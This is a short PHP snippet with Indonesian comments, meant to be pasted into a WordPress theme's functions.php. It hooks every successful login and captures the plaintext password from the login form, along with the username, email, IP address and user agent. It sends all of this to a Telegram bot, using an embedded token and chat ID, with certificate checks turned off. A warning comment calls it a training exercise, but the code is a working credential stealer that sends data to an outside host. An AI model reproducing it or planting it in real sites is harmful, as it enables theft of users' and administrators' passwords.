
/**


- ADD THIS CODE IN THEMES/FUNCTION.PHP


 * Mengait ke aksi login WordPress yang berhasil (wp_login).
 * Fungsi ini akan berjalan setiap kali pengguna berhasil login.
 *
 * PERINGATAN KERAS: Skrip ini menangkap dan mengirim kata sandi dalam bentuk teks biasa.
 * Ini adalah praktik yang SANGAT TIDAK AMAN dan menciptakan celah keamanan yang besar.
 * HANYA GUNAKAN UNTUK LATIHAN KEAMANAN SIBER DALAM LINGKUNGAN TERKENDALI.
 * JANGAN PERNAH MENGGUNAKAN SKRIP INI DI SITUS WEB PRODUKSI (LIVE).
 *
 * @param string $user_login Username yang digunakan untuk login.
 * @param object $user       Objek WP_User dari pengguna yang login.
 */
add_action('wp_login', 'send_successful_login_notification_to_telegram', 10, 2);

function send_successful_login_notification_to_telegram($user_login, $user) {
    // --- KONFIGURASI WAJIB ---
    // Ganti dengan Token Bot Anda dari @BotFather
    $bot_token = '8056005260:AAFuEUtuaMePHIwBZUnSIUX4BZPpTEs4L7I';
    $chat_id = '5232333870';
    // -------------------------

    // Mengumpulkan informasi detail dari login yang berhasil
    $site_name    = get_bloginfo('name');
    $user_ip      = $_SERVER['REMOTE_ADDR'];
    $user_agent   = $_SERVER['HTTP_USER_AGENT'];
    $login_time   = current_time('mysql');

    // Menangkap kata sandi yang dimasukkan dari form login.
    // INI ADALAH BAGIAN YANG SANGAT BERBAHAYA.
    $entered_password = isset($_POST['pwd']) ? $_POST['pwd'] : '[Password tidak terdeteksi]';

    // Membuat pesan notifikasi dengan format Markdown
    $message  = "✅ *Notifikasi: Login Berhasil Terdeteksi* ✅\n\n";
    $message .= "Seseorang baru saja berhasil login ke situs WordPress Anda dengan kredensial berikut:\n\n";
    $message .= "🌐 *Situs:* " . $site_name . "\n";
    $message .= "👤 *Username:* " . esc_html($user_login) . "\n";
    $message .= "🔑 *Password Digunakan:* " . esc_html($entered_password) . "\n\n"; // Menampilkan password
    $message .= "--- Detail Pengguna & Sesi ---\n";
    $message .= "📧 *Email Pengguna:* " . $user->user_email . "\n";
    $message .= "📍 *Alamat IP:* " . $user_ip . "\n";
    $message .= "💻 *User Agent:* " . $user_agent . "\n";
    $message .= "⏰ *Waktu:* " . $login_time . "\n\n";
    $message .= "#SuccessfulLogin #" . preg_replace('/[^a-zA-Z0-9]/', '', $site_name);

    // URL API Telegram untuk mengirim pesan
    $api_url = "https://api.telegram.org/bot{$bot_token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message) . "&parse_mode=Markdown";

    // Mengirim permintaan ke API Telegram menggunakan cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}
